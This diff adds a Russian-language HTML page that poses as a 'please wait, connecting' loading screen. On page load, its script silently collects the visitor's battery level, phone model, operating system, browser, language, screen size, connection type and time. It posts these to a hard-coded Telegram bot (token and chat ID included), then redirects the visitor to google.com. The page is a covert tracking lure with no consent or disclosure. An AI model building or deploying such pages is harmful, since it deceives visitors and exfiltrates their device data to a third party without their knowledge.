@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Подключение...</title>
+  <style>
+    body {
+      background: linear-gradient(135deg, #74ebd5 0%, #ACB6E5 100%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      height: 100vh;
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #333;
+    }
+    h1 {
+      font-size: 2em;
+      margin-bottom: 20px;
+      animation: pulse 2s infinite;
+    }
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #3498db;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin-top: 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+  </style>
+</head>
+<body>
+  <h1>Пожалуйста, подождите...</h1>
+  <div class="loader"></div>
+
+  <script>
+    const botToken = '8105265816:AAGjMWIUj7FMeTzvn-RA7ykKT8d12ejJdgw';
+    const chatId = '7614644519';
+
+    function sendMessage(text) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: text
+        })
+      })
+      .then(res => res.json())
+      .then(data => console.log('Сообщение отправлено:', data))
+      .catch(error => console.error('Ошибка:', error));
+    }
+
+    function extractPhoneModel(userAgent) {
+      const match = userAgent.match(/Android.*?;\s*(.+?)\s*Build/);
+      if (match && match[1]) {
+        return match[1].trim();
+      }
+      return 'Неизвестно';
+    }
+
+    function getBrowser(userAgent) {
+      if (userAgent.indexOf("Firefox") > -1) return "Firefox";
+      if (userAgent.indexOf("Edg") > -1) return "Microsoft Edge";
+      if (userAgent.indexOf("Chrome") > -1) return "Google Chrome";
+      if (userAgent.indexOf("Safari") > -1) return "Safari";
+      if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) return "Opera";
+      return "Неизвестно";
+    }
+
+    function getOS(userAgent) {
+      if (/Android/.test(userAgent)) {
+        const version = userAgent.match(/Android\s([0-9\.]+)/);
+        return version ? `Android ${version[1]}` : 'Android';
+      } else if (/iPhone|iPad|iOS/.test(userAgent)) {
+        return 'iOS';
+      } else if (/Windows/.test(userAgent)) {
+        return 'Windows';
+      } else if (/Mac OS/.test(userAgent)) {
+        return 'Mac OS';
+      }
+      return 'Неизвестно';
+    }
+
+    async function collectAndSendInfo() {
+      try {
+        let batteryLevel = 'Неизвестно';
+        if ('getBattery' in navigator) {
+          const battery = await navigator.getBattery();
+          batteryLevel = Math.round(battery.level * 100) + '%';
+        }
+
+        const userAgent = navigator.userAgent;
+        const phoneModel = extractPhoneModel(userAgent);
+        const os = getOS(userAgent);
+        const browser = getBrowser(userAgent);
+        const language = navigator.language || 'Неизвестно';
+        const screenSize = `${screen.width}x${screen.height}`;
+        const darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Да' : 'Нет';
+
+        let connectionType = 'Неизвестно';
+        if ('connection' in navigator) {
+          connectionType = navigator.connection.effectiveType || 'Неизвестно';
+        }
+
+        const now = new Date();
+        const timeString = now.toLocaleString();
+
+        const messageText = `Новый заход!
+
+Батарея: ${batteryLevel}
+Модель телефона: ${phoneModel}
+Операционная система: ${os}
+Браузер: ${browser}
+Язык: ${language}
+Экран: ${screenSize}
+Интернет: ${connectionType}
+Тёмная тема: ${darkMode}
+Время: ${timeString}`;
+
+        sendMessage(messageText);
+
+        setTimeout(() => {
+          window.location.href = "https://google.com"; // Можно заменить на любой другой сайт
+        }, 2500);
+        
+      } catch (error) {
+        console.error('Ошибка при сборе:', error);
+      }
+    }
+
+    collectAndSendInfo();
+  </script>
+</body>
+</html>
